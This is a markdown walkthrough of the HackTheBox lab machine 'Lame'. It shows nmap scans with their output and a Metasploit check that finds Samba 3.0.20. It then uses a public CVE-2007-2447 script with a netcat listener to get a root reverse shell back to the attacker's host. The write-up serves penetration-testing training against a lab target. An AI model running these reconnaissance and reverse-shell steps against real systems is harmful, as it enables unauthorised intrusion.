# Lame Walkthrough

![lame](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Lame/lame.png)

## Let's first fast scan our machine with nmap 

```
sudo nmap -F -sV 10.10.10.3
```

### Result

```
PORT    STATE SERVICE     VERSION 
21/tcp  open  ftp         vsftpd 2.3.4 
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) 
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Now let's berif scan our machine with open ports

```
sudo nmap -A -O -v -p 21,22,139,445 --script vuln 10.10.10.3
```

### Result

```
PORT    STATE SERVICE     VERSION 
21/tcp  open  ftp         vsftpd 2.3.4 
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) 
| vulners:  
|   cpe:/a:openbsd:openssh:4.7p1:  
|       SECURITYVULNS:VULN:8166 7.5     https://vulners.com/securityvulns/SECURITYVULNS:VULN:8166 
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2010-4478/      7.5     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE
-2010-4478/     *EXPLOIT* 
|       MSF:ILITIES/LINUXRPM-ELSA-2008-0855/    7.5     https://vulners.com/metasploit/MSF:ILITIES/LINUXRPM-ELSA-2008-0855/  *
EXPLOIT* 
|       MSF:ILITIES/GENTOO-LINUX-CVE-2010-4252/ 7.5     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2010-4252/
*EXPLOIT* 
|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478 
|       CVE-2008-1657   6.5     https://vulners.com/cve/CVE-2008-1657 
|       SSV:60656       5.0     https://vulners.com/seebug/SSV:60656    *EXPLOIT* 
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906 
|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107 
|       MSF:ILITIES/SUSE-CVE-2011-5000/ 3.5     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2011-5000/  *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2012-0814/       3.5     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2012-0814/      *EXPLOIT* 
|       MSF:ILITIES/GENTOO-LINUX-CVE-2011-5000/ 3.5     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2011-5000/
*EXPLOIT* 
|       MSF:ILITIES/AMAZON-LINUX-AMI-ALAS-2012-99/      3.5     https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-AL
AS-2012-99/     *EXPLOIT* 
|       CVE-2012-0814   3.5     https://vulners.com/cve/CVE-2012-0814 
|       CVE-2011-5000   3.5     https://vulners.com/cve/CVE-2011-5000 
|       CVE-2008-5161   2.6     https://vulners.com/cve/CVE-2008-5161 
|       CVE-2011-4327   2.1     https://vulners.com/cve/CVE-2011-4327 
|       MSF:ILITIES/SSH-OPENSSH-X11USELOCALHOST-X11-FORWARDING-SESSION-HIJACK/  1.2     https://vulners.com/metasploit/MSF:ILI
TIES/SSH-OPENSSH-X11USELOCALHOST-X11-FORWARDING-SESSION-HIJACK/ *EXPLOIT* 
|       CVE-2008-3259   1.2     https://vulners.com/cve/CVE-2008-3259 
|_      SECURITYVULNS:VULN:9455 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:9455 
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port 
Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%)
, Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 24
5 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iD
RAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (l
ikely embedded) (92%) 
No exact OS matches for host (test conditions non-ideal). 
Uptime guess: 0.005 days (since Sat Apr  2 09:27:21 2022) 
Network Distance: 2 hops 
TCP Sequence Prediction: Difficulty=198 (Good luck!) 
IP ID Sequence Generation: All zeros 
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 
 
Host script results: 
|_smb-vuln-ms10-054: false 
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug) 
|_smb-vuln-ms10-061: false 
 
TRACEROUTE (using port 22/tcp) 
HOP RTT       ADDRESS 
1   294.45 ms 10.10.14.1 
2   293.06 ms 10.10.10.3
```

## After analysis nmap result we get 21 port is for ftp and 22 for ssh and two ports 139 and 445 is samba ports. Now let's try to find smaba version .

## I tried enum4linux but that's don't work for me then i use metasploit auxiliary  for finding samba version and that's work for me, auxiliary given below.

```
auxiliary/scanner/smb/smb_version
```

### Result

```
[*] 10.10.10.3:445        - SMB Detected (versions:1) (preferred dialect:) (signatures:optional) 
[*] 10.10.10.3:445        -   Host could not be identified: Unix (Samba 3.0.20-Debian) 
[*] 10.10.10.3:           - Scanned 1 of 1 hosts (100% complete) 
[*] Auxiliary module execution completed
```

## Here we got samba version 3.0.20, let's search on google if this version of samba have any exploitable vulnerability , you also use searchsploit for finding vulnerability.

## We got Username' map script vulnerability let's google about it. we got CVE: 2007-2447 , we got a github url https://github.com/amriunix/CVE-2007-2447 that give a python script and usage about this script let's use it and gain iaccess to the system.

![github](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Lame/github.png)

```
python usermap_script.py 10.10.10.3 139 <ip> 1337
``` 

## Start a net cat listner and run the above command.

# BOOOMMMMMM!!!!!!!!!! WE GOT SHELL WITH HIGH PRIVILEGES. 

![cool](https://c.tenor.com/hI-oOVvwasYAAAAC/happy.gif)
